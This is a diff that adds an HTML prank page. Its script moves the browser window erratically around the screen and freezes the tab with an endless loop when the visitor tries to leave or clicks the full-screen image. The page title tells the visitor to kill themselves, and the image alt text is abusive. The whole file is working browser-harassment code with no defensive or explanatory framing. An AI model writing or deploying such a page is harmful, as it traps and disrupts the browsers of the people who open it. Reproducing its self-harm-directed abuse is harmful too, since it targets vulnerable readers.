@@ -1,0 +1,103 @@
+<html>
+    <head>
+        <title>KILL YOURSELF</title>
+        <style>
+            .troll {
+                height: 100%;
+                width: 100%;
+            }
+        </style>
+    </head>
+    <body>
+        <script>
+            function hang() {
+                let c = 0;
+                while(1) document.title = c++;
+            }
+            
+            window.onbeforeunload = function(){
+        return hang();
+        }
+            function RB(min, max) {
+       return Math.floor(Math.random() * (max - min + 1) + min)
+    }
+            var x = 0;
+            var y = 0;
+            var tX = 0;
+            var tY = 0;
+            var tP = 0;
+            var tMAX = RB(10, 100);
+            var tMIN = RB(1, 10);
+            var count = RB(1, 100);
+            var count1 = RB(1, 50);
+            var q = 0;
+            var q1 = 0;
+            var plus = 1;
+            var plus2 = 0;
+            function move() {
+                switch(tX) {
+                case 0:
+                    x = x + plus;
+                    if(x > screen.width - window.outerWidth) {
+                        tX = 1;
+                    }
+                    break;
+                case 1:
+                    x = x - plus;
+                    if(x < 0) {
+                        tX = 0;
+                    }
+                    break;
+            }
+            switch(tY) {
+                case 0:
+                    y = y + plus;
+                    if(y > screen.height - window.outerHeight) {
+                        tY = 1;
+                    }
+                    break;
+                case 1:
+                    y = y - plus;
+                    if(y < 0) {
+                        tY = 0;
+                    }
+                    break;
+            }
+            switch(tP) {
+                    case 0:
+                        plus++;
+                        if(plus > tMAX) {
+                            q1++;
+                            plus--;
+                            if(q1 < count1) break;
+                            q1 = 0;
+                            tP = 1;
+                            count1 = RB(1, 500);
+                            tMAX = RB(10, 200);
+                        }
+                        break;
+                    case 1:
+                        plus--;
+                        if(plus < tMIN) {
+                            q++;
+                            plus++;
+                            if(q < count) break;
+                            q = 0;
+                            tP = 0;
+                            count = RB(1, 5000);
+                            tMIN = RB(1, 10);
+                        }
+                        break;
+                }
+            window.moveTo(x,y);
+            }
+            function LOL() {
+                tX = RB(0,1);
+                tY = RB(0,1);
+            }
+            setInterval(move, 10);
+            setInterval(LOL, 500);
+        </script>
+        <img class="troll" src="BerserkForest.jpg" alt="FUCK YOU" onclick="hang()">
+    </body>
+</html>
